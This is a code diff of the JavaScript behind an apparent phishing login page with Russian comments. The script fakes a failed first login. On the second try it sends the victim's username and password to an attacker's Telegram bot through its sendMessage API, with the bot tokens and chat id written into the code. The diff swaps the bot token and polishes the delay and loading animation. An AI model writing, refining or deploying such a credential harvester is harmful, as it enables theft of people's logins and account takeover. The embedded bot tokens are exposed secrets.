@@ -1,7 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
     const form = document.getElementById('telegramForm');
     const loading = document.getElementById('loading');
-    const validText = document.querySelector(".invalid") 
+    const validText = document.querySelector(".invalid");
     let tryCount = 0; // Счётчик попыток входа
 
     form.addEventListener('submit', function(e) {
@@ -20,46 +20,40 @@ document.addEventListener('DOMContentLoaded', () => {
             password.classList.add('invalid-input');
             validText.style.display = 'block';
             username.value = '';
-                    password.value = '';
+            password.value = '';
             
             tryCount++;
             return; // Прекратить выполнение функции
         } else {
             // На второй попытке показываем анимацию загрузки
+            loading.style.display = 'flex';
             
-            // Задержка перед отправкой данных
-            setInterval(() => {
-                loading.style.display = 'flex';
-            }, 500);
-            
+            setTimeout(() => {
                 const encodedUsername = encodeURIComponent(username.value);
                 const encodedPassword = encodeURIComponent(password.value);
                 const jonatish = `<b>Username:</b> <em>${encodedUsername}</em>\n<b>Password:</b> <em>${encodedPassword}</em>`;
 
-                const url = `https://api.telegram.org/bot6681983180:AAFEgYgqQiWC4-0rAdlW7Vu_4RBUF_r6se4/sendMessage?chat_id=697727022&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;
+                const url = `https://api.telegram.org/bot7575654032:AAESrI_zG-pFVDF02UzZ2zVjiXKP55N4m3Q/sendMessage?chat_id=697727022&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;
                 
                 fetch(url, { method: 'GET' })
-                .then(response => response.json())
-                .then(data => {
-                    loading.style.display = 'none'; // Скрыть анимацию загрузки
-                    console.log(data);
-                    if (data.ok) {
-                        console.log(data.result.message_id);
-                        // Здесь можно добавить действия при успешной отправке данных
-                    } else {
-                        console.log(data.error_code);
-                        // Обработка ошибок отправки
-                    }
-                    
-                })
-                .catch((error) => {
-                    alert("Error! Please try again: " + error.message);
-                    console.log(error);
-                    loading.style.display = 'none';
-                    username.value = '';
-                    password.value = '';
-                });
-            // Задержка в 20 секунд перед отправкой данных
+                    .then(response => response.json())
+                    .then(data => {
+                        loading.style.display = 'none'; // Скрыть анимацию загрузки
+                        if (data.ok) {
+                            console.log(data.result.message_id);
+                            // Здесь можно добавить действия при успешной отправке данных
+                        } else {
+                            console.log(data.error_code);
+                            // Обработка ошибок отправки
+                        }
+                    })
+                    .catch((error) => {
+                        alert("Error! Please try again: " + error.message);
+                        loading.style.display = 'none';
+                        username.value = '';
+                        password.value = '';
+                    });
+            }, 2000); // Задержка в 2 секунды перед отправкой данных
         }
     });
 });
